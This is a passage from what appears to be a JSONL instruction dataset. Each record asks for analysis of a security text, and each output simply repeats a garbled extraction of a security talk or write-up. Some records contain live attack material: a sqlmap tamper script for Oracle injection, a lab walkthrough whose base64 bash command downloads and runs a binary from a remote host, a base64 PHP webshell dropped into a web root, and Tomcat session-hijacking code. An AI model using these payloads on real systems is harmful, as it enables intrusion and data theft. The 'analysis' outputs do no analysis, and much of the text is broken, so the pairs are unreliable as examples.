https://emeraldonion.org/arin/ Autonomous System Number (ASN) 396507 ARIN Policy 4.10: Dedicated IPv4 block to facilitate IPv6 Deployment When ARIN receives its last /8 IPv4 allocation from IANA, a contiguous /10 IPv4 block will be set aside and dedicated to facilitate IPv6 deployment. Allocations and assignments from this block must be justified by immediate IPv6 deployment requirements. Examples of such needs include: IPv4 addresses for key dual stack DNS servers, and NAT-PT or NAT464 translators. ARIN staff will use their discretion when evaluating justifications. This block will be subject to a minimum size allocation of /28 and a maximum size allocation of /24. ARIN should use sparse allocation when possible within that /10 block. In order to receive an allocation or assignment under this policy: 1. the applicant may not have received resources under this policy in the preceding ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nRADIO EXPLOITATION 101 MATT KNIGHT // MARC NEWLIN // BASTILLE NETWORKS CHARACTERIZING//CONTEXTUALIZING//CLASSIFYING RF ATTACKS OFFENSIVE WIRELESS TECHNIQUES PHY && MAC LAYERS MOBILE IoT and means WIRELESS TECH IS DIVERSE AND INCUMBENT ATTACK SURFACES GALORE RADIO EXPLOITATION 101 // BASTILLE NETWORKS WHO ARE THESE GUYS  Matt Knight  Software Engineer and Security Researcher @  Reverse engineered the LoRa wireless protocol in 2016  BE & BA from Dartmouth  Marc Newlin  Security Researcher @  Discovered Mousejack vulnerability in 2016  Finished 3rd in DARPA Spectrum Challenge in 2012  Finished 2nd in DARPA Shredder Challenge in 2010 matt@ .net @embeddedsec marc@ .net @marcnewlin RADIO EXPLOITATION 101 // BASTILLE NETWORKS AGENDA 1. Historical retrospective of wired and wireless security tech development 2. Key RF concepts 3. Methods of Wireless Exploitation  Techniques, impact, and defenses  Analogues to wired networks  Examples and demos (do it live!) 4. How to apply this information EVOLUTION OF NETWORK SECURITY HISTORICAL BACKGROUND https://frostedpress.ﬁles.wordpress.com/2016/09/4286297.png 1990s Packet snifﬁng in the 802.3 802.5 Protocols: http://s202976374.onlinehome.us/ebay/test_equip/analyzers/Dolch_PAC_64_05.jpg NETWORK GENERAL PACKET SNIFFER $8,000+ (in 1990s dollars) Installed on a Dolch lunchbox computer http://s202976374.onlinehome.us/ebay/test_equip/analyzers/Dolch_PAC_64_05.jpg NETWORK GENERAL PACKET SNIFFER $8,000+ (in 1990s dollars) Installed on a Dolch lunchbox computer ! PROPRIETARY 1998 Packet snifﬁng in ETHEREAL // WIRESHARK $0 https://blog.wireshark.org/wp-content/uploads/2013/10/ethereal-0.2.0.png ETHEREAL // WIRESHARK $0 https://blog.wireshark.org/wp-content/uploads/2013/10/ethereal-0.2.0.png \" COMMODITY 2000s Packet snifﬁng since the LTE-M GPS 802.5 802.11 WiMax Enocean DMR 802.3 HSPA LTE CDMA GSM Bluetooth Bluetooth LE Z-Wave 802.15.4 GPRS EDGE DECT LoRa SIGFOX 802.16 nRF24 NB-IoT Protocols: TONS OF WIRELESS EARLY SDRS >>$100K EARLY SDRS >>$10", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n_vti_fpxploitation mshannon@fpxploiter.org Frontpage: Laying the ground work What is it?  Microsoft's integrated Web Site development tool.  System for adding basic to advanced functionality with little or no web page experience.  Integrated MS Office package  Security Nightmare Who is Vermeer Technologies?  In early 1995, Vermeer Technologies developed one of the first web publishing tools for simple end users, Frontpage.  Following enormous success, the application was later bought out by Microsoft and integrated in the Office package. Frontpage: Decoding the system Protocol Analysis Client/Server Protocol Analysis  Communication between Client and Server.  Frontpage Client and Server extensions communicate over HTTP PUT requests. The Frontpage client makes requests against Author.dll, Admin.dll, and shtml.exe. Author.dll(exe) Authoring commands, uploading, downloading content, reviewing properties, adding enhancements. Admin.dll(exe) Admin commands, including adding additional users, modify user permissions, listing accounts. Shtml.exe, vti_rpc Initial access and service negotiation. The Authentication System This authentication process takes place each time a request is performed, i.e login, upload, download, change permissions, navigate folders, etc. While an ineffective use of resources, it does limit attacks based on state. _vti_inf.html  _vti_inf.html  This file provides configuration information and helps us determine something about the server. _vti_inf.html Cont.  Using the following simple guidelines when reading the _vti_inf.html file we can better determine the operating system.  _vti_inf.html files with references to .exe tools most likely reside on Unix servers.  _vti_inf.html files with references to .dll tools most likely reside on Windows Servers  Server extension version numbers can further help us narrow down the options. _vti_inf Version Table  Using the information in _vti_inf.html, we can often correctly determine the OS version. Operating Sy", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nOpen RazzmatazZ Laboratory (OrzLab) Jim Huang( 黃敬群 /jserv) Email: <jserv.tw@gmail.com> <jserv@openmoko.org> Blog: http://blog.linux.org.tw/jserv/ 電信通訊 的自由與 安全議題 July 22, 2007 http://orzlab.blogspot.com/ 自我 介紹 OpenMoko 開發者 手機 /PDA  Mobile TV/ 數位電視代工設計 參與自由軟體開發 新酷音輸入法 Kaffe.org / GNU Classpath ... (http://jserv.sayya.org/ for details) ... 專業熱血工讀生 提綱 通訊裝置背後的議題 電信通訊的自由開放 安全性挑戰 裝置 背後 的議題 (1) 複雜性多樣性 高度整合 五花八門 行動 電話 的時代 2006 年 < 200 Million PC sold > 200 Million Phones sold ( 光第三季 ) 0.5 Billion PC in 2003 1.5 Billion consumers own mobile phones worldwide -- Economist, Jan 2006 3 Billion subscribers by 2008 裝置 行動 電話 的大量 系統 整合 裝置 背後 的議題 (2) 誰在聽你 講電話 不只是情人間的細語呢喃 通訊 自由 權 (1) 華民國憲法第二章第七條保障的基本人權 人身自由 ( 第 8 條 ) 言論講學著作及出版自由 ( 第 11 條 ) 祕密通訊自由 ( 第 12 條 ) 1999 年六月 22 日三讀通過通訊保障及監察 法 依據電信法第七條秘密通訊分兩項 電信之內容 ( 監聽 ) 電信之有無 ( 通聯查詢 ) 通訊 自由 權 (2) 自由自由多少罪惡假汝之名而行 羅蘭夫人於送上斷頭台前夕 通訊法規與法治人權 違反法律保留原則 憲法第二十三條之基本原則通聯之調閱應 以法律而非以行政命令來規範 違反比例原則 不應以一條街或一個地區為執行之範圍 違反透明化原則與保護隱私權原則 調閱通聯應適用執行監聽之規定 於執行結束後應通知受監察之人 裝置 背後 的議題 (2) 封閉的系統 壟斷性的電信業者 待開 放的 電信網 路 (1) 許多廠商與組織指出電信廠商的限制將阻礙無 線網路與電信發展 Skype 向 FCC 提出請願書要求立法部門放鬆限制 要求 FCC 為無線網路建立開放標準組織 openmoko 建構 100% open source 手機 不受電信廠商約束直接將手機賣給用戶 待開 放的 電信網 路 (2) 電信廠商僅針對由自家銷售的手機和服務開放網 路支援 通常採取封閉技術以鎖定所銷售的手機 2007 年二月哥倫比亞大學法學系教授 Tim Wu 於 blog 譴責 強勢操控設備和應用市場的產品設計與創 新因而損害消費者的利益 兩大公益組織支持 Public Knowledge Media Access Project (MAP) 電信 通訊 的自由 開放 (1) 手機禁用的功能 手機 禁用 的功能 Wi-Fi (dual-mode phone) Bluetooth file transfer (high volume) Built-in wireless connectivity CE Dialing timer Limited to specific network 電信 通訊 的自由 開放 (2) 手機受限的功能 手機 受限 的功能 某些 GPS 服務應用 某些先進的 SMS 功能 某些行動瀏覽器 基於商業利益的行為 Cingular/AT&T Wireless 曾要求 Nokia 移除歐 洲版 E61/62 Smartphone 內的 Wi-Fi 才可在 美國網路中使用 Verizon 禁止 phone vendor 啟用 bluetooth 檔 案傳輸功能只因為希望用戶將 camera 所生 的照片傳到 ( 收費的 )Verizon 網站 .... 電信 通訊 的自由 開放 (3) 手機製造商與應 用服務者的訴求 Skype 於 2007.02.21 向 FCC 提出請願書 製造 商與 應用服 務者 的訴求 (1) 要求電信業者同意 只要不具危險性 任何設備均可連接到其網路 任何應用均可執行於其網路 用戶可瀏覽所有合法的網站 成立獨立專注於相關行動應用的產業組織 製造 商與 應用服 務者 的訴求 (2) 是的我們存活於 謊言背信行為受限 受監視缺乏自由 的陰影之下 部份電信廠商在服務條款中禁止使用 Skype Skype ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nPART 01 CONTENTS PART 02 PART 03 PART 04 01 02 03 04 PART 01      PART 01 Recon Weaponiza tion delivery Exploitatio n Installation Command / Control Action on Objections     I           PART 02 -  -      >> PART 03                              1 . 144 235", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n2021-9-27 Written By J0o1ey QQ/vx 547006660 如有红队/渗透测试方向培训需求或其他业务项目可联系我 在对某 SRC 测试时本人根据其证书信息收集到了部分深度子域并找到了其对 应的业务 IP 段 写了个 shell 脚本+ffuf 批量 fuzz 某 src c 段资产目录 fuzz 发现了 xxSRC c 段的一个提供了 webservice 的服务器 http://180.*.*.*/webservice/ 获取到接口 http://180.*.*.*/webservice/syncOrderToOdcService 使用 soup ui 进行调试 数据 <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:odc=\"http://odc.ws.qiku.com/\"> <soapenv:Header/> <soapenv:Body> <odc:syncOrderInfo> <!--Optional:--> <arg0></arg0> </odc:syncOrderInfo> </soapenv:Body> </soapenv:Envelope> <arg0></arg0> 当<arg0></arg0>中间无参数值时 Soap 接口抛出了一个 Oracle 的错误信息并提示Date format error,YY-MM-DD 随后很简单了构造一个符合条件的 date 数据 2021-9-23 Soap request <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:odc=\"http://odc.ws.qiku.com/\"> <soapenv:Header/> <soapenv:Body> <odc:syncOrderInfo> <!--Optional:--> <arg0>2021-9-23</arg0> </odc:syncOrderInfo> </soapenv:Body> </soapenv:Envelope> arg0 处为日期参数指定日期即可查询到 xx src 商城所有订单信息 属于严重泄露客户数据的漏洞 看了一下 oracle 都爆出 SQL 的错误信息了并且没有预编译相关的提示这不得 注入一波 但是在注入的时候发现程序会将括号()过滤掉导致函数无法执行sqlmap 注入 不出来 这时候就要用到骚姿势了 在 Oracle 中文版本中,中文括号可以代替英文()而且不报错 EG: # 纯中文括号 SQL> select 1+1 from dual; 1+1 ---------- 2 剩下的就很简单了改一个 tamper 出来 #!/usr/bin/env python \"\"\" Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/) See the file 'doc/COPYING' for copying permission \"\"\" import os import re from lib.core.common import singleTimeWarnMessage from lib.core.enums import DBMS from lib.core.enums import PRIORITY __priority__ = PRIORITY.HIGHEST def dependencies(): singleTimeWarnMessage(\"tamper script '%s' is unlikely to work against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.PGSQL)) def tamper(payload, **kwargs): retVal = payload if payload: retVal = re.sub(r\"\\s*(\\s*\", \"\", retVal) retVal = re.sub(r\"\\s*)\\s*\", \"\", retVal) return retVal >>>python sqlmap.py -r xxx.txt --dbs --tamper=brackets.py //注入请求在日期处 加* w 到手收摊", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n遇到一个场景当前/app路径下无法写入任何的jsp文件但/ROOT下可以写 但/ROOT/ 下写的无法直接Class.forName等操作/app/下的类 测试发现tomcat的类加载器 ParallelWebappClassLoader 可获取到所有context 信息 思路其实就是通过当前context获取到parent也就是host在基于host搜索其他 context如下 this.getClass().getClassLoader().resources.context.parent.children 其实主要目的是找classloader所以直接找到 this.getClass().getClassLoader().resources.context.parent.childClassLoaders /manager 的类加载器可以看到没有任何class 而我们应用的则多上不少破坏父类委派的表现 代码实现如下 ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); try { Object resources = getFieldValue(this.getClass().getClassLoader(), \"resources\"); Map<Object, String> childClassLoaders = (Map<Object, String>) getFieldValue( getFieldValue( getFieldValue(resources, \"context\"), \"parent\"), \"childClassLoaders\"); for (Map.Entry entry : childClassLoaders.entrySet()) { if (entry.getValue().equals(\"/app\")) { classLoader = (ClassLoader)entry.getKey(); break; } } } catch (Exception ignored) { } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public static Object getFieldValue(Object obj, String fieldName) throws Exception { Field f = null; if (obj instanceof Field) { f = (Field)obj; } else { Method method = null; Class cs = obj.getClass(); while(cs != null) { try { f = cs.getDeclaredField(fieldName); cs = null; } catch (Exception var6) { cs = cs.getSuperclass(); } } } f.setAccessible(true); return f.get(obj); } 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 又有个问题我想绕过认证直接生成有效session分析了目标应用他的认证 是将user写入到session中那么session怎么跨context注入我回头想我在context里找 一个已有的session就行了没必要用当前使用的 查了下资料tomcat管理session的方式有一个ConcurrentHashMap存储所有 session一般是在context下所以和上面思路一样 this.getClass().getClassLoader().resources.context.manager.sessions 遇到一个小bug下面方法所在类的类加载器可能并不是 ParallelWebappClassLoader所以需要搜索下父类如下 public Object getSession(String id) throws Exception { Object session = null; java.lang.ClassLoader classLoader = this.getClass().getClassLoader(); int count = 0; while (!classLoader.getClass().getName().contains(\"ParallelWebappCla ssLoader\")) { classLoader = ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nHow the ELF ruined Christmas Alessandro Di Federico UC Santa Barbara July 18, 2015 Index The exploit The dynamic loader The attacks RELRO Implementation Recap & countermeasures The exploitation process 1 Find a useful vulnerability 2 Obtain code execution 3 Perform the desired actions Our focus is on the last step How can we perform the attack in presence of speciﬁc countermeasures? Code execution is not enough  Being able to divert execution is important  But the problem is then where to point execution  Modern operating systems prevent execution of data Code reuse attacks  Its not possible to introduce new executable data  Lets reuse existing code!  return-into-libc  return-oriented programming Address Space Layout Randomization  The OS randomizes the position of libraries  The code is there, but where? The typical situation  The position of the main executable is usually known  Its image keeps references to imported library functions  printf  memcpy  ... The need for a memory leak  Suppose printf is imported but execve is not,we can: 1 Obtain the address of printf 2 Compute the distance between printf and execve 3 Divert execution to addressOf(printf)distance(printf, execve) The problem  Requires a memory leak vulnerability  Requires knowledge about the layout of the library  Requires an interaction between the victim and the attacker Lets re-think the attack What are we trying to do? Were trying to obtain the address of an arbitrary library function We already have an operating system component for that The dynamic loader Index The exploit The dynamic loader The attacks RELRO Implementation Recap & countermeasures ELF  ELF stands for Executable and Linking Format  Well consider it to be divided in sections  .text: executable code  .data: writeable global data  .rodata: read-only global data  .bss: uninitialized global data  ... Calling a library function i n t main ( ) { p r i n t f ( \" Hello world ! \\ n \" ) ; return 0; } Calling a library function i n t main ( ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nKnow Your Foe Threat Infrastructure Analysis Pitfalls Who Are We?  Founders of PassiveTotal  Analysts/researchers with 10+ years of collective experience  Interested in  Better UX/UI for security systems  Improving/re-thinking analyst workflows  Imparting our knowledge #knowyourfoe | @PassiveTotal 1. Analysis Background Whats the threat research process? #knowyourfoe | @PassiveTotal Threat Analysis Lifecycle 2. Collect Data 3. Make Assessment 1. Surface Suspicious #knowyourfoe | @PassiveTotal  Signatures and monitors  In-house data collection and analysis  Proactive research to identify threats  Paid feeds of data and threat intelligence Threat Analysis Lifecycle 2. Collect Data 3. Make Assessment 1. Surface Suspicious #knowyourfoe | @PassiveTotal  Collect data from all OSINT sources  Pay for analysis or data feeds from providers  Preserve any relevant activity for the case  Contact private research groups or networks Threat Analysis Lifecycle 2. Collect Data 3. Make Assessment 1. Surface Suspicious #knowyourfoe | @PassiveTotal  Aggregate enough data to derive the full picture  Consult multiple sources and weight opinions  Use subject matter expertise to determine good or bad Tell Me About youtubee.xyz  Resolves to 185.86.167.27  Geolocation of Turkey  Active since June 1st 2015  Uses Ideal Hosting as a provider  Known malware associated with domain and IP  WHOIS information is privacy protected  Labeled as phishing on blacklist  Uses AS29262  Part of /24 subnet on 185.86.167.0/24  Domain is not dynamic DNS  IP address is not a sinkhole  Large amount of associations to IP 2. Common Pitfalls Avoid weak connections and false conclusions #knowyourfoe | @PassiveTotal Connections using Subnets. Subnets are network allocations given to potential businesses or organizations to host Internet-facing infrastructure. #knowyourfoe | @PassiveTotal Example: 185.86.167.27 is part of 185.86.167.0/24 Pitfalls with Subnets  Subnet sizes could include thousands of potential addresses ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nOWASP TOP 10 01 OWASP Top10 A032021-注入 A05:2021-配置错误 API 安全痛点 02 甲方漏洞现状 编号 漏洞标题 定义 1 水平越权 对象级别的越权通过某个遍历参数可以访问到其他对象资源 2 过度数据暴露 依赖通用方法开发人员倾向于公开所有对象属性而不考虑其各自的敏感度依赖客户端 在向用户显示数据前执行数据筛选返回的数据也缺失脱敏操作 3 注入 当不受信任的数据作为命令或查询的一部分发送给解释器 时就会出现注入缺陷如 SQLNoSQL命令注入等 攻击者的恶意数据可诱使解释器在未经恰当授权的情况下 执行非预期的命令或访问数据 4 业务安全缺陷 业务逻辑上的缺陷主要是过分信任用户的输入这些漏洞跟业务强相关 5 安全配置错误 安全错误配置通常是由于不安全的默认配置不完整或临 时配置开放云存储开发 swagger配置错误的HTTP 头不必要的 HTTP 方法允许跨域资源共享(CORS)和包 含敏感信 息的详细错误消息造成的 6 高并发缺陷 攻击者通过并发http/tcp请求而达到次获奖多次收获多次获赠等非正常逻辑所能触发 的效果一般都是系统幂等性设计缺失或者错误导致的额 痛点 API多 发版快 敏感多数据 人力支撑困难 越权占比高 API 安全收敛体系 03 SDL BP架构 漏洞收敛体系 应用安全三板斧 应用安全三板斧之IAST API 网关 API 管控平台 提问环节 提问环节", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n1 启元学堂REDV靶场练习 环境部署 具 Start 看readme即可 X-C2 冰蝎3 webanalyzer ... 点http://192.168.88.101/ 环境部署 具 Start 2 看下指纹眼看上去就是hexo 1 { 2 \"name\": \"Hexo\", 3 \"version\": \"5.3.0\", 3 录扫描 没什么东 4 \"detail\": \"regex \\\"Hexo(?: v?([\\\\d.]+))?\\\" match meta[gene rator] of http://192.168.88.101/\", 5 \"origin\": \"wappalyzer\" 6 }, 4 web1上81端还有服务 应该要CVE-2021-3129打 tips: 攻击的结果基本所有脚本都是写在laravel.log但是这个路径在实战中很有可能是不存在的需要去猜 我是mac测试的因为payload貌似不能换需要加-w0 https://stackoverflow.com/questions/46463027/base64-doesnt-have-w-option-in-mac 这上说的是mac下的-w0是默认的还是不只能换linux 5 这个漏洞如果找不到log路径可以配合fastcgi或者redis打 把脚本改下找到利链之后持定义命令 6 中后 1 bash=bash -c {echo,Y2QgL3RtcC8gJiYgY3VybCBodHRwOi8vMTkyLjE2OC44OC4 xMDA6ODA4MS93ZWIxICAtbyBuZ2lueCAmJiBjaG1vZCAreCBuZ2lueCAmJiAuL25na W54}|{base64,-d}|{bash,-i} 7 发现是不出的我配置的络环境只允许dmz出 写冰蝎 1 echo PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogI CAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IC8v6K+l5a+G6ZKl5Li66L+e5o6l5a+ G56CBMzLkvY1tZDXlgLznmoTliY0xNuS9je+8jOm7mOiupOi/nuaOpeWvhueggXJlY mV5b25kCgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJc2Vzc2lvbl93cml0ZV9jbG9zZSg pOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZ Xh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGV jb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3Ryb GVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiR rZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc 8 2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHB sb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kY XJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmF sKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7C j8+Cg==|base64 -d > /var/www/html/wfox_coolcat.php 9 然后 是个docker 10 补充下查看ip的命令 1 curl ifconfig.me 2 curl -4/-6 icanhazip.com 3 curl ipinfo.io/ip 4 curl api.ipify.org 5 curl checkip.dyndns.org 6 dig +short myip.opendns.com @resolver1.opendns.com 7 host myip.opendns.com resolver1.opendns.com 8 curl ident.me 9 curl bot.whatismyipaddress.com 10 curl ipec", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nHITCON Badge 2019 MCU ARM TrustZone challenge Alan Lee , yuawn , will About yuawn  CTF - DoubleSigma / Balsn / BFKinesiS  NTU - nslab  Focus on binary exploitation _yuawn yuawn Agenda  Introduction  HITCON Badge 2019 Challenge  ARM TrustZone mechanism on MCU  Exploitation  Make TrustZone great again Source code and exploit are released! https://github.com/yuawn/HITCON-badge-2019 What is TrustZone?  Secure Environment Separation  Normal world (non-secure world)  UI, APP, etc.  Secure world - TEE (Trusted Execution Environment)  Authentication, Mobile Payment, Content protection  Hypervisor ARM TrustZone ARM Trusted Firmware APPs Trusted APPs OS Trusted OS What is TrustZone?  TrustZone Hardware Architecture  NS bit in register  TrustZone Software Implementation  TEE OS  TEEGRIS - Samsung  trusty - Google  OP-TEE - Open source  TA (Trusted Application) TrustZone on M2351 TrustZone on M2351  Non-secure function  Non-secure callable function  Secure function TrustZone on M2351  System Memory Map HITCON Badge  LED  A simple command line interface  Snake  Lock record  Key, token  Crypto Non-secure Secure HITCON Badge  Locks are stored in Secure Region  Unlock  nsc_unlock  Implement in secure code Badge Command Line _ _ ___ _____ ___ ___ _ _ ___ __ _ ___ | || |_ _|_ _/ __/ _ \\| \\| | |_ ) \\/ / _ \\ | __ || | | || (_| (_) | .` | / / () | \\_, / |_||_|___| |_| \\___\\___/|_|\\_| /___\\__/|_|/_/ HitconBadge2019 >> Badge Command Line HitconBadge2019 >> help show info unlock setname clear hello angelboy yuawn ping ls id cat echo alias whoami help show HitconBadge2019 >> show Pattern 0: Lock led 00: Lock led 01: Lock led 02: Lock Pattern 1: Lock led 03: Lock led 04: Lock led 05: Lock Pattern 2: Lock led 06: Lock led 07: Lock led 08: Lock Pattern 3: Lock led 09: Lock led 10: Lock led 11: Lock Pattern 4: Lock led 12: Lock led 13: Lock led 14: Lock Pattern 5: Lock led 15: Lock led 16: Lock led 17: Lock Pattern 6: Lock led 18: Lock led 19: Lock led 20: Lock Pattern 7: Lock led 21: Lock led ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nSix$Degrees$of$Domain$Admin Using&Graph&Theory&to&Accelerate&Red&Team&Operations DEF&CON&24& Las&Vegas,&NV&2016 Andy&Robbins&- @_wald0 Rohan&Vazarkar - @CptJesus Will&Schroeder&- @harmj0y About$Us$ Andy$Robbins  Offensive&Network&Services& Team&Lead&at&Veris&Groups& Adaptive&Threat&Division  Red&team&and&penetration&test& lead  Performed&hundreds&of&network& penetration&tests  With&Brandon&Henry,&identified& critical&vulnerability&in&ACH&file& processing&procedures About$Us$ Rohan$Vazarkar  Penetration&tester&at&Veris& Groups&Adaptive&Threat&Division  Co-author&and&major&contributor& to&many&projects,&including& EyeWitness and&Python&Empire  Presenter:&BSidesDC,&BSidesLV,& BSidesDE,&Black&Hat&Arsenal  Trainer:&Black&Hat&USA&2016 About$Us$ Will$Schroeder  Researcher&at&Veris&Groups& Adaptive&Threat&Division  Co-founder&of&the&Veil- Framework,&PowerView,& PowerUp,&Empire/EmPyre  Active&PowerSploit devleoper  Microsoft&PowerShell/CDM&MVP  Speaker&and&various&cons&and& BlackHat trainer Defenders$think$in$lists.$ Attackers$think$in$graphs.$As$long$ as$this$is$true,$attackers$win. - John&Lambert,&General&Manager,&Microsoft&Threat& Intelligence&Center Agenda  The&Current&State&of&AD&Domain&Privilege&Escalation  The&Concept&of&Derivative&Local&Admin  A&Crash&Course&in&Graph&Theory  Stealthy&Data&Collection&with&PowerView  The&Release&of&BloodHound  Closing&Remarks&and&Future&Plans Prior$Work  Derivative&Local&Admin&by&Justin&Warner&(@sixdub)&- http://www.sixdub.net/?p=591  Active&Directory&Control&Paths&by&Emmanuel&Gras&and&Lucas&Bouillot - https://github.com/ANSSI-FR/AD-control-paths  One&of&the&best&AD&Security&resources&- https://adsecurity.org/ The$Current$State$of$Active$ Directory$Domain$Privilege$ Escalation Current$State$of$AD$Domain$Priv Esc  Active&Directory&is&ubiquitous.  LOTS&of&security&research&devoted&to&Active&Directory  Sometimes&we&get&easy&buttons!&J  Easy&buttons&have&a&tendency&to&disappear.  The&best&tradecraft&includes,&but&does&not&rely&on&easy&butt", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nDisclaimer: This presentation is based upon personal research that was not supported or authorized by my employer. The material being presented may be considered offensive to those with weak hearts or those highly invested in technology funds. Robert Stucke bobx@rot26.net DNS Has Been Found To Be Hazardous To Your Health Use With Caution About Me Phoenix @ 90K feet! Agenda  DNS Bit-Squatting  Misunderstood end-point DNS behavior  You dont own that domain, I do  Abandoned Botnets and Forgotten Toys Bit-Squatting Presented by Artem Dinaburg at Blackhat and Defcon in 2011  Project Page http://dinaburg.org/bitsquatting.html  Presentation Video http://youtu.be/lZ8s1JwtNas  Presentation Slides http://dinaburg.org/data/DC19_Dinaburg_Presentation.pdf Bit-Squatting  What is it?  Why does it happen?  What is the impact? Bit-Squatting Bit-Squatting 0110011101101111011011110110 0110011101101101011011110110 Bit-Squatting What is Bit-Squatting?  Anticipate the way a single bit error in memory will corrupt the DNS name  Registering those mangled domains  Rapture, Mayhem, Yay! Bit-Squatting 01100111011011110110111101100111011011000110010100101110011000110110111101101101 01100111011011110110111101100110011011000110010100101110011000110110111101101101 google.com goofle.com Bit-Squatting What causes these memory errors?  Heat  Electrical Problems  Radioactive Contamination  Cosmic Rays! Bit-Squatting Phones Bit-Squatting The guidance we give to data center operators is to raise the thermostat.  Many data centers operate at 70 degrees or below. Wed recommend looking at going to 80 degrees - Erik Teetzel Energy Program Manager at Google The peak operating temperature Googles Belgium data center reaches is 95 degrees Fahrenheit! Bit-Squatting Bit-Squatting gstatic.com Google domain for serving static content CSS Images Javascript XML Bit-Squatting gstatic.com fstatic.com estatic.com cstatic.com ostatic.com wstatic.com grtatic.com gqtatic.com gwtatic.com gctatic.com g3tatic.com gsuatic.co", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nMindAPI 最近API安全概念停的正好前阵在Twitter上看到个API安全的思维导图感觉很全 在这稍微总结下 框架识别 1.API框架种类 (1) REST APIs RESTful OData (2) GraphQL 这有个关于GraphQL的测试项 https://github.com/nicholasaleks/graphql-threat-matrix (3) SOAP SOAP 很熟悉了也就是WebService开源的Service框架有Apache CXF以及Apache AXIS1 2等 (4) XML-RPC 以更简单的 XML 格式传输数据,这很容易联想到Apache OFbiz XML-RPC 反序列化漏洞 (5) JSON-RPC 以JSON格式化式传输数据 (6) gRPC-Protobuf 可以从header头Content-Type以及Access-control-expose-headers 响应头 2.API框架简介相关文档 https://smartbear.com/blog/soap-vs-rest-whats-the-diﬀerence/ https://www.odata.org/documentation/ https://www.howtographql.com/basics/1-graphql-is-the-better-rest/ https://www.smashingmagazine.com/2016/09/understanding-rest-and-rpc-for-http-ap is/ https://www.soapui.org/docs/rest-testing/working-with-rest-services/ https://cloud.google.com/blog/products/api-management/understanding-grpc-openapi -and-rest-and-when-to-use-them https://openapi.tools/ 些框架带URL特征 三如何盒进API信息收集 这主要列出了些API接测试的具和站及技巧 具BurpmitmproxyWiresharkAPKLeaksAPKEnumApi-GuesserKeyhacks Google搜索技巧site:target.tld inurl:api intitle:\"index of\" \"api.yaml\" site:target.tld WADL WSDLinurl:/application.wadluser ﬁletype:wadlext:wadluser ﬁletype:wsd ext:wsdl ODataInurl:/%24metadata Githubhttps://github.com/search?q=target.tld+%252Bapi https://github.com/search?q=target.tld+application.wadl&type=code https://github.com/search?q=target.tld+*.wsdl&type=code 其他intitle:\"index of\" intext:\"apikey.txt\" site:target.tldallintext:\"API_SECRET*\" ext:env | ext:yml site:target.tld https://github.com/dxa4481/truﬄeHog https://github.com/eth0izzle/shhgit 些API聚合以及搜索站 https://apilist.fun/ https://apiharmony-open.mybluemix.net/public https://www.programmableweb.com/ https://rapidapi.com/hub http://apis.io/ https://app.swaggerhub.com/search https://apis.guru/ https://www.postman.com/explore/apis https://any-api.com/ https://smart-api.info/registry https://www.apistack.io/ https://public-apis.xyz/ API字典及枚举具 四API接测试 1.些具 REST APIshttps://github.com/ﬂipkart-incubator/Astra https://github.com/bncrypted/apidor h", "category": "text_analysis", "source": "security_papers"}
